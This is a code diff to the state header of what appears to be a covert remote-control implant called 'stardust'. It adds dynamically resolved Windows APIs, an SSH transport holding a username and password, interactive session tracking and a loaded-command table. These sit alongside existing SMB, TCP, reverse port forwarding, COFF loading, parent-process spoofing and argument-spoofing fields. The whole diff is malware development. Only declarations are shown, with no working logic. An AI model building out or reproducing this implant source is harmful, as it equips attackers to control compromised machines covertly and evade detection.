@@ -117,6 +117,14 @@ namespace stardust
                 D_API( GetFileAttributesW )
                 D_API( TerminateThread )
                 D_API( GetExitCodeThread )
+                D_API( SetEnvironmentVariableW )
+                D_API( GetTempPathW )
+                D_API( CreateProcessA )
+                D_API( SetHandleInformation )
+                D_API( GetExitCodeProcess )
+                D_API( GetTempPathA )
+                D_API( SetEnvironmentVariableA )
+                D_API( DeleteFileA )
             };
         } kernel32 = {
             RESOLVE_TYPE( LoadLibraryA ),
@@ -167,7 +175,15 @@ namespace stardust
             RESOLVE_TYPE( VirtualProtect ),
             RESOLVE_TYPE( GetFileAttributesW ),
             RESOLVE_TYPE( TerminateThread ),
-            RESOLVE_TYPE( GetExitCodeThread )
+            RESOLVE_TYPE( GetExitCodeThread ),
+            RESOLVE_TYPE( SetEnvironmentVariableW ),
+            RESOLVE_TYPE( GetTempPathW ),
+            RESOLVE_TYPE( CreateProcessA ),
+            RESOLVE_TYPE( SetHandleInformation ),
+            RESOLVE_TYPE( GetExitCodeProcess ),
+            RESOLVE_TYPE( GetTempPathA ),
+            RESOLVE_TYPE( SetEnvironmentVariableA ),
+            RESOLVE_TYPE( DeleteFileA )
         };
 
         struct {
@@ -401,6 +417,11 @@ namespace stardust
             char     pipename[256];
             uint32_t smb_id;
 #endif
+#if defined( SSH_TRANSPORT )
+            char     ssh_username[64];
+            char     ssh_password[128];
+            uint32_t ssh_mode;
+#endif
         } transport = {};
 
 #if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
@@ -415,6 +436,18 @@ namespace stardust
 #if defined( TCP_TRANSPORT )
         uintptr_t tcp_listen_sock;
         uintptr_t tcp_client_sock;
+#endif
+
+#if defined( SSH_TRANSPORT )
+        struct {
+            HANDLE   h_process;
+            HANDLE   h_thread;
+            HANDLE   h_stdin;
+            HANDLE   h_stdout;
+            bool     connected;
+            bool     persistent;
+            char     askpass_path[260];
+        } ssh = {};
 #endif
 
         struct SmbLink {
@@ -448,6 +481,20 @@ namespace stardust
 #endif
 #ifdef INCLUDE_CMD_SSH
         void* ssh_state;
+
+        static constexpr uint32_t MAX_INTERACTIVE_SESSIONS = 4;
+        struct InteractiveSession {
+            char     task_uuid[37];
+            uint32_t ssh_session_idx;
+            bool     active;
+        };
+        InteractiveSession interactive_sessions[MAX_INTERACTIVE_SESSIONS] = {};
+
+        struct {
+            uint8_t* buffer;
+            uint32_t length;
+            uint32_t capacity;
+        } interactive_queue = {};
 #endif
 #ifdef INCLUDE_CMD_RPFWD
         void* rpfwd_state;
@@ -543,6 +590,21 @@ namespace stardust
             uint32_t output_length;
             uint32_t output_capacity;
         } coff = {};
+
+        struct LoadedCommand {
+            uint8_t cmd_id;
+            void*   handler;
+            bool    active;
+        };
+
+        static constexpr uint32_t MAX_LOADED_COMMANDS = 64;
+
+        struct {
+            LoadedCommand entries[MAX_LOADED_COMMANDS];
+            uint32_t      count;
+            void*         module_bases[MAX_LOADED_MODULES];
+            uint32_t      module_count;
+        } loaded = {};
 
         uint32_t ppid_spoof = 0;
         char*    argue_args = nullptr;
